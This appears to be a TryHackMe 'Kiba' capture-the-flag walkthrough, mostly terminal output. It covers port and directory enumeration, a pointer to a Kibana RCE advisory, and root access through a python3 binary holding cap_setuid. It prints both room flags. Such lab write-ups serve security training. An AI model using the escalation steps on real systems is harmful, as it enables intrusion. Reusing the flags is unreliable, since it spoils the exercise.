link: https://tryhackme.com/room/kiba
## Enumeration
<code>
  
┌──(duke㉿kali)-[~/Documents/THM_Kiba]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.124.166 -x .txt,.php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.124.166
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2024/02/16 02:48:08 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1291]
/server-status        (Status: 403) [Size: 278] 
                                                
===============================================================
2024/02/16 03:43:29 Finished
===============================================================
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Kiba]
└─$ nmap  -p- -Pn 10.10.124.166
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-16 03:57 CST
Nmap scan report for 10.10.124.166
Host is up (0.036s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5044/tcp open  lxi-evntsvc
5601/tcp open  esmagent

Nmap done: 1 IP address (1 host up) scanned in 23.05 seconds

## found Kibana Version: 6.5.4
link: https://systemweakness.com/this-kibana-vulnerability-can-give-you-rce-in-a-snap-kibana-cve-2019-7609-7de49112139e

kiba@ubuntu:/home/kiba$ cat user.txt
cat user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
kiba@ubuntu:/home/kiba$ THM{1s_easy_pwn3d_k1bana_w1th_rce}
THM{1s_easy_pwn3d_k1bana_w1th_rce}
THM{1s_easy_pwn3d_k1bana_w1th_rce}: command not found
kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
kiba@ubuntu:/home/kiba$ 

## Privilage Escalation 

iba@ubuntu:/$ getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

kiba@ubuntu:/home/kiba$ ls -la
total 110664
drwxr-xr-x  6 kiba kiba      4096 Mar 31  2020 .
drwxr-xr-x  3 root root      4096 Mar 31  2020 ..
-rw-------  1 kiba kiba      9605 Mar 31  2020 .bash_history
-rw-r--r--  1 kiba kiba       220 Mar 31  2020 .bash_logout
-rw-r--r--  1 kiba kiba      3771 Mar 31  2020 .bashrc
drwx------  2 kiba kiba      4096 Mar 31  2020 .cache
drwxrwxr-x  2 kiba kiba      4096 Mar 31  2020 .hackmeplease
drwxrwxr-x  2 kiba kiba      4096 Mar 31  2020 .nano
-rw-r--r--  1 kiba kiba       655 Mar 31  2020 .profile
-rw-r--r--  1 kiba kiba         0 Mar 31  2020 .sudo_as_admin_successful
-rw-r--r--  1 root root       176 Mar 31  2020 .wget-hsts
-rw-rw-r--  1 kiba kiba 113259798 Dec 19  2018 elasticsearch-6.5.4.deb
drwxrwxr-x 11 kiba kiba      4096 Dec 17  2018 kibana
-rw-rw-r--  1 kiba kiba        35 Mar 31  2020 user.txt

kiba@ubuntu:/home/kiba$ cd .hackmeplease
kiba@ubuntu:/home/kiba/.hackmeplease$ ls -la
total 4356
drwxrwxr-x 2 kiba kiba    4096 Mar 31  2020 .
drwxr-xr-x 6 kiba kiba    4096 Mar 31  2020 ..
-rwxr-xr-x 1 root root 4452016 Mar 31  2020 python3

kiba@ubuntu:/home/kiba/.hackmeplease$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<kmeplease$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   
id
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
pwd          
/home/kiba/.hackmeplease
cd /root
ls
root.txt
ufw
cat root.txt
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}

</code>
